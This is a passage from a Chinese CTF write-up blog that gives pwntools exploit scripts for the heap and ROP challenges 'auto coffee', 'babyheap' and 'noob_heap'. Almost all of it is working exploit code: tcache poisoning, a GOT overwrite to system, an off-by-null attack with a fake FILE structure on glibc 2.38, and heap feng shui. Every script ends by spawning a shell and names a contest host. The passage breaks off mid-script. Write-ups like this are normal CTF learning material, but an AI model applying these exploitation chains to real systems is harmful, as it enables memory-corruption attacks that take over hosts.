class="hljs-string">&#x27;write&#x27;</span>],libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]),stdout_got)<br>payload2 += ret2csu(<span class="hljs-number">1</span>,bss+<span class="hljs-number">0x500</span>,<span class="hljs-number">0x40</span>,stdout_got)<br>payload2 = payload2.ljust(<span class="hljs-number">0x300</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>sd(payload2)<br><br>payload3 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span> + p64(bss) + p64(<span class="hljs-number">0x0000000000400876</span>)<br>sd(payload3.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="auto-coffee"><a href="#auto-coffee" class="headerlink" title="auto coffee"></a>auto coffee</h2><p>能直接覆写第二个指针组的，sb了我淦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><span class="hljs-comment"># elf = ELF(&#x27;./challenge&#x27;)</span><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;43.132.193.22&#x27;</span>, <span class="hljs-number">9998</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./coffee&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;4421&#x27;</span>)<br>    sl(<span class="hljs-string">b&#x27;just pwn it&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">out</span>():<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy1</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;buy\n&#x27;</span>,<span class="hljs-built_in">str</span>(choice).encode())<br>    sla(<span class="hljs-string">b&#x27;N\n&#x27;</span>,<span class="hljs-string">b&#x27;N&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy2</span>(<span class="hljs-params">choice,content</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;buy\n&#x27;</span>,<span class="hljs-built_in">str</span>(choice).encode())<br>    sla(<span class="hljs-string">b&#x27;N\n&#x27;</span>,<span class="hljs-string">b&#x27;Y&#x27;</span>)<br>    sa(<span class="hljs-string">b&#x27;\n&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re_coffee</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(choice).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">choice,idx,content</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(choice).encode())<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    sa(<span class="hljs-string">b&#x27;\n&#x27;</span>,content)<br><br>buy1(<span class="hljs-number">1</span>)<br>login()<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>out()<br><br>buy1(<span class="hljs-number">2</span>)<br>login()<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>out()<br><br>buy1(<span class="hljs-number">1</span>)<br>login()<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>out()<br><br>buy1(<span class="hljs-number">2</span>)<br>login()<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>out()<br><br>buy1(<span class="hljs-number">1</span>)<br>login()<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>out()<br><br>buy1(<span class="hljs-number">2</span>)<br>login()<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>out()<br><br>buy1(<span class="hljs-number">1</span>)<br>login()<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0x4063c0</span>))<br>out()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    buy1(<span class="hljs-number">3</span>)<br><br>login()<br>re_coffee(<span class="hljs-number">3</span>)<br>re_coffee(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,p64(<span class="hljs-number">0x406300</span>)+p64(<span class="hljs-number">0x4062f0</span>)+p64(<span class="hljs-number">0x406018</span>))<br><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,p64(<span class="hljs-number">0x406000</span>))<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;3.&#x27;</span>)<br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc.address&quot;</span>,libc.address)<br><br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>sa(<span class="hljs-string">b&#x27;\n&#x27;</span>,p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>out()<br><br>buy2(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>2.38的off by null（你惦记你那逼unlink干啥呢）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-comment"># elf = ELF(&#x27;./challenge&#x27;)</span><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;43.132.193.22&#x27;</span>, <span class="hljs-number">9998</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;babyheap&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>menu = <span class="hljs-string">b&#x27;&gt;&gt; \n&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    sa(<span class="hljs-string">b&#x27;\n&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    sla(<span class="hljs-string">b&#x27;\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    sa(<span class="hljs-string">b&#x27;\n&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br>ru(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>heap = <span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x2a0</span><br>leak(<span class="hljs-string">&quot;heap_base&quot;</span>,heap)<br><br>add(<span class="hljs-number">0x4f8</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br>add(<span class="hljs-number">0x4f8</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x4f8</span>,p64(heap+<span class="hljs-number">0x7b0</span>)+p64(heap+<span class="hljs-number">0x7b0</span>)+<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x4e0</span>+p64(<span class="hljs-number">0x500</span>))<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>,p64(heap+<span class="hljs-number">0x2b0</span>)+p64(heap+<span class="hljs-number">0x2b0</span>))<br><br>delete(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">b&#x27;\n&#x27;</span>)<span class="hljs-comment">#1</span><br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">0</span>)<br><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x8</span>,p64((heap&gt;&gt;<span class="hljs-number">12</span>)^(heap+<span class="hljs-number">0xae0</span>)))<br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br><br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br>show(<span class="hljs-number">2</span>)<br><br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1feed0</span><br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br><br>delete(<span class="hljs-number">4</span>)<br>delete(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x8</span>,p64((libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]^(heap&gt;&gt;<span class="hljs-number">12</span>))))<br><br>fake_io_addr = heap + <span class="hljs-number">0x2c0</span><br>fake_IO_struct = <span class="hljs-string">b&#x27;  sh;\x00\x00\x00&#x27;</span>   <span class="hljs-comment">#rdi</span><br>fake_IO_struct += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">0x4</span><br>fake_IO_struct += p64(<span class="hljs-number">1</span>)<br>fake_IO_struct = fake_IO_struct.ljust(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(heap + <span class="hljs-number">0x800</span>)<br>fake_IO_struct = fake_IO_struct.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_struct += p64(fake_io_addr + <span class="hljs-number">0x200</span>) <span class="hljs-comment">#fake_wide_addr</span><br>fake_IO_struct = fake_IO_struct.ljust(<span class="hljs-number">0xd8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_struct += p64(libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>])<br>fake_IO_struct = fake_IO_struct.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_struct += <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0xe0</span><br>fake_IO_struct += p64(fake_io_addr + <span class="hljs-number">0x200</span> + <span class="hljs-number">0xe0</span>)<br>fake_IO_struct += <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x60</span> + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])  <span class="hljs-comment">#system/setcontext</span><br><br>add(<span class="hljs-number">0x408</span>,fake_IO_struct+<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x408</span>,p64(heap+<span class="hljs-number">0x2c0</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]+<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>gdb.attach(p)<br>sla(menu,<span class="hljs-string">b&#x27;5&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="强网拟态"><a href="#强网拟态" class="headerlink" title="强网拟态"></a>强网拟态</h1><p>甲级战犯第二场</p><h2 id="noob-heap"><a href="#noob-heap" class="headerlink" title="noob_heap"></a>noob_heap</h2><p>玩个🐕8堆风水，🧠要坏掉了</p><p>off by null 和malloc_consolidate的利用点是一眼就看出来了，然后👴风水做法做了四个小时实在扛不住了耻辱下班md</p><p>后来看了星盟的exp后恍然大悟。malloc_consolidate终归还是不是很熟悉，哎。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-comment"># elf = ELF(&#x27;./challenge&#x27;)</span><br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;43.132.193.22&#x27;</span>, <span class="hljs-number">9998</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./noob_heap&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>menu = <span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    sa(<span class="hljs-string">b&#x27;: &#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br>add(<span class="hljs-number">0x78</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x78</span>)<br>show(<span class="hljs-number">0</span>)<br>heap_base = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>)[-<span class="hljs-number">5</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="hljs-number">12</span><br>leak(<span class="hljs-string">&quot;heap_base&quot;</span>,heap_base)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add(<span class="hljs-number">0x78</span>)  <span class="hljs-comment">#1-6</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):<br>    add(<span class="hljs-number">0x78</span>)  <span class="hljs-comment">#7-24</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(i)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    delete(i+<span class="hljs-number">7</span>)<br>sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x400</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x78</span>) <span class="hljs-comment">#0-6</span><br><br>add(<span class="hljs-number">0x78</span>)  <span class="hljs-comment">#7</span><br>show(<span class="hljs-number">7</span>)<br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x21a0f0</span><br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add(<span class="hljs-number">0x78</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(i)<br><br>edit(<span class="hljs-number">13</span>,p64(heap_base+<span class="hljs-number">0x910</span>)*<span class="hljs-number">2</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x80</span>))<br>delete(<span class="hljs-number">12</span>)<br>delete(<span class="hljs-number">11</span>)<br>sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x400</span>)<br><br><br>edit(<span class="hljs-number">10</span>, p64((heap_base + <span class="hljs-number">0x790</span>))*<span class="hljs-number">2</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x80</span>))<br>delete(<span class="hljs-number">9</span>)<br>sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x400</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x78</span>)<br><br>add(<span class="hljs-number">0x78</span>)<br>add(<span 